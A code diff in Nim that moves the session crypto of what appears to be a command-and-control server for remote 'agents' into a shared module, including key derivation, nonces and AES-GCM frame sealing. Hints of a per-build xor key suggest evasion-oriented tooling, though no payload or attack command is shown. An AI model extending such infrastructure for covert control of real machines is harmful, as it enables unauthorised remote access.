@@ -23,6 +23,7 @@ import std/[asyncdispatch, asyncnet, asynchttpserver, nativesockets, json, os, t
           sha1, monotimes, httpclient, uri, net]
 import std/[algorithm]
 import nimcrypto/[pbkdf2, sha2, hmac, utils, bcmode, rijndael, sysrand]
+import common/proto
 import winim/lean
 
 # The build script regenerates a fresh 16-byte xorkey.nim before each
@@ -263,64 +264,24 @@ proc geoJson(remoteAddr: string, g: GeoInfo): JsonNode =
   }
 
 # ------------------------------------------------------------
-# CRYPTO (matching agent v2)
+# CRYPTO — shared implementation in common/proto.nim (imported at
+# the top of this file). Only the session-object wrappers live here.
 # ------------------------------------------------------------
-proc deriveSessionKey(secret: string,
-                      ourNonce, peerNonce: openArray[byte]): array[32, byte] =
-  var ctx: HMAC[sha256]
-  ctx.init(secret)
-  ctx.update(ourNonce)
-  ctx.update(peerNonce)
-  let d = ctx.finish()
-  for i in 0..<32: result[i] = d.data[i]
-  ctx.clear()
-
-proc makeNonce(ctr: uint32, randBytes: openArray[byte]): array[12, byte] =
-  result[0] = byte((ctr shr 24) and 0xFF)
-  result[1] = byte((ctr shr 16) and 0xFF)
-  result[2] = byte((ctr shr 8) and 0xFF)
-  result[3] = byte(ctr and 0xFF)
-  for i in 0..<8: result[4 + i] = randBytes[i]
-
-proc makeAad(agentId: string, dir: byte): seq[byte] =
-  result = newSeqOfCap[byte](agentId.len + 1)
-  for c in agentId: result.add(byte(c))
-  result.add(dir)
-
 proc encryptFrame(s: AgentSession, plain: string): seq[byte] =
   var randBytes: array[8, byte]
   discard randomBytes(addr randBytes[0], 8)
   let nonce = makeNonce(s.sendCtr, randBytes)
   inc s.sendCtr
   let aad = makeAad(s.id, AAD_DIR_S2A)
-  var ctx: GCM[aes256]
-  ctx.init(s.key, nonce, aad)
-  let pt = cast[seq[byte]](plain)
-  var ct = newSeq[byte](pt.len)
-  ctx.encrypt(pt, ct)
-  let tag = ctx.getTag()
-  result = newSeqOfCap[byte](12 + ct.len + 16)
+  result = newSeqOfCap[byte](12 + plain.len + 16)
   for b in nonce: result.add(b)
-  for b in ct: result.add(b)
-  for b in tag: result.add(b)
+  for b in gcmSeal(s.key, nonce, aad, plain): result.add(b)
 
 proc decryptFrame(s: AgentSession, blob: openArray[byte]): string =
   if blob.len < 28: return ""
   var nonce: array[12, byte]
   for i in 0..<12: nonce[i] = blob[i]
-  let ctLen = blob.len - 12 - 16
-  if ctLen < 0: return ""
-  let ct = blob[12 ..< 12 + ctLen]
-  let tag = blob[blob.len - 16 ..< blob.len]
-  let aad = makeAad(s.id, AAD_DIR_A2S)
-  var ctx: GCM[aes256]
-  ctx.init(s.key, nonce, aad)
-  var pt = newSeq[byte](ct.len)
-  if not ctx.decrypt(ct, pt, tag): return ""
-  result = cast[string](pt)
-
-proc hmacHex(secret, data: string): string =
-  toHex(sha256.hmac(secret, data).data)
+  gcmOpen(s.key, nonce, makeAad(s.id, AAD_DIR_A2S), blob[12 ..< blob.len])
 
 proc bytesToHex(b: openArray[byte]): string =
   result = newString(b.len * 2)
